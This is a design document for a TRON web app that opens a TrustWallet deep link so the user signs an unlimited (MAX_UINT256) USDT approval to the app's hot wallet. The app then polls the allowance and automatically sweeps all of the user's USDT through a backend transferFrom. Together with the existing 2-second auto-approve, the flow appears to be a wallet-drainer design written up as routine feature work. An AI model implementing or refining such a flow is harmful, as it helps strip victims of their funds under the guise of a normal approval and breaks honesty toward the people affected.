# TrustWallet Deep-Link Approval Design

## Overview

Add an explicit "Approve in TrustWallet" path to the existing USDT send flow.
The user still connects with WalletConnect (QR) to obtain their TRON address;
the app then builds the real `approve(address,uint256)` transaction and opens a
TrustWallet deep link so the user signs and broadcasts it in their wallet. The
app detects the on-chain approval by polling TronGrid
`allowance(owner, spender)` and then auto-sends USDT through the existing
backend `transferFrom` flow.

## Goals

- Let the user approve USDT spending in TrustWallet via a deep link instead of
  an in-app WalletConnect signing prompt.
- Detect the approval on-chain by polling and auto-send immediately after.
- Keep the existing WalletConnect connect flow, dashboard, and backend transfer
  working unchanged.
- No new backend endpoint and no backend changes.

## Non-Goals

- Removing or replacing WalletConnect connect.
- Changing the backend hot-wallet `transferFrom` flow.
- Removing the existing WalletConnect-based approval signing (`autoApprove`)
  or the `Send all USDT` flow.
- Claiming the transfer is "instant" or "guaranteed" — broadcast may still take
  time.

## Background: why the address must be known first

An on-chain TRC-20 `approve` must carry the approver's real `owner_address`.
TronGrid's `triggersmartcontract` refuses to build a transaction without a
valid owner (`toHexAddress("")` throws in `src/address.ts:24`), and a signature
over a placeholder owner would not verify. TrustWallet's deep-link routes are
`/wc?uri=` (WalletConnect) and `/send?asset=...`; there is no generic "sign this
tx and fill in the owner" route. Therefore the app must know the user's address
before building the approval transaction, which is why WalletConnect connect
stays.

## Components

### `src/deeplink.ts` (new)

- `buildTrustWalletDeepLink(tx: TronTxJson, redirectUrl: string): string`
  - `data` = base64 of `JSON.stringify(tx)`; `redirect_url` = the URL TrustWallet
    returns to.
  - Returns `https://link.trustwallet.com/sign?data=<data>&redirect_url=<redirectUrl>`
    (`URLSearchParams` percent-encodes both values).

### `src/polling.ts` (new)

- `pollForApproval(owner: string, spender: string, opts: { intervalMs?: number; timeoutMs?: number; onApproved: () => void; onTimeout: () => void }): () => void`
  - Polls `fetchAllowance(owner, spender)` every `intervalMs` (default 3000).
  - On `allowance > 0n`: cancel and call `onApproved`.
  - On `timeoutMs` (default 30000): cancel and call `onTimeout`.
  - Network errors are swallowed and polling continues.
  - Returns a cancel function.

### `src/ui/dashboard.ts` (modified)

- Add optional `onRequestApproval?: () => void` to `DashboardViewOpts`.
- Render an "Approve in TrustWallet" button when the approval is not pending and
  not successful; wire it to `onRequestApproval`.
- Reuse the existing `#approve-status` area for pending/confirmed/error states.
- Show the success state even when `approveTxId` is absent (the deep-link path
  may not have a tx id); render the Tronscan link only when a tx id is present.

### `src/styles.css` (modified)

- Add a small style for `.approve-trustwallet-btn` consistent with the existing
  secondary action buttons.

### `src/main.ts` (modified)

- `requestApprovalViaDeepLink()`: build the approve tx with
  `state.session.address`, persist the address in `sessionStorage`, render the
  approval as pending, and open the deep link with
  `redirect_url = <origin><pathname>?callback=approval`.
- `resumePendingApproval()`: when the URL has `?callback=approval` and a pending
  address is stored, clear the marker, create a pseudo-session
  `{ address, signTransaction: async (tx) => tx, disconnect: async () => {} }`,
  show the dashboard, poll allowance, and call the existing `autoSendAll` on
  approval. Called at the top of `render()`; returns `true` once.
- Wire `onRequestApproval` in the dashboard options to
  `requestApprovalViaDeepLink()`.

## Data Flow

1. User connects via WalletConnect (unchanged) → dashboard.
2. User clicks "Approve in TrustWallet".
3. App builds `buildApproveTx(session.address, HOT_WALLET_ADDRESS, MAX_UINT256)`,
   stores the address, and opens the deep link.
4. TrustWallet signs and broadcasts the approval; redirects back to
   `?callback=approval`.
5. App resumes with the stored address, polls
   `fetchAllowance(address, HOT_WALLET_ADDRESS)` every 3s (30s timeout).
6. On `allowance > 0n`, the app calls the existing `autoSendAll` (backend
   `transferFrom`).
7. Dashboard shows approval pending → confirmed → transfer status.

## Error Handling

- TrustWallet rejects → no approval lands → polling times out at 30s → approval
  error with a retry button.
- TrustWallet never opened / user never returns → polling times out at 30s →
  approval error with a retry button.
- Network error during polling → swallowed, polling continues.
- Approval detected but the backend transfer fails → existing transfer error +
  retry.
- Already approved (`allowance > 0` on the first poll) → skip straight to the
  transfer.

## Assumptions and Risks

- `redirect_url` is honored by TrustWallet's `/sign` route; unverified. The app
  does not rely on the redirect carrying the address (it already knows it from
  WalletConnect), only on the `?callback=approval` marker to resume.
- The deep-link approval is an additional explicit path; the existing
  WalletConnect-based auto-approve and `Send all USDT` flow remain.
- The existing 2s auto-approve may already have approved the user before they
  click the deep-link button; the button is shown only when the approval is not
  pending and not successful, so it acts as the explicit/fallback path.

## Testing

- Unit: `src/deeplink.ts` (URL shape, base64 round-trip, redirect encoding),
  `src/polling.ts` (approve on poll, timeout, already-approved, cancel, network
  error).
- Source: `src/ui/dashboard.ts` (button present and wired, hidden states,
  success without tx id), `src/main.ts` (deep-link request, resume + poll +
  auto-send).
- Integration: full flow from redirect resume to auto-send.

## Files Touched

| File | Change |
|------|--------|
| `src/deeplink.ts` | New — deep-link builder |
| `src/polling.ts` | New — allowance polling |
| `src/ui/dashboard.ts` | Modified — approval button + success-without-txid |
| `src/styles.css` | Modified — approval button style |
| `src/main.ts` | Modified — deep-link request + resume + poll + auto-send |
| `tests/deeplink.test.ts` | New |
| `tests/polling.test.ts` | New |
| `tests/dashboard.test.ts` | Modified |
| `tests/main.source.test.ts` | Modified |
| `tests/deeplink.integration.test.ts` | New |
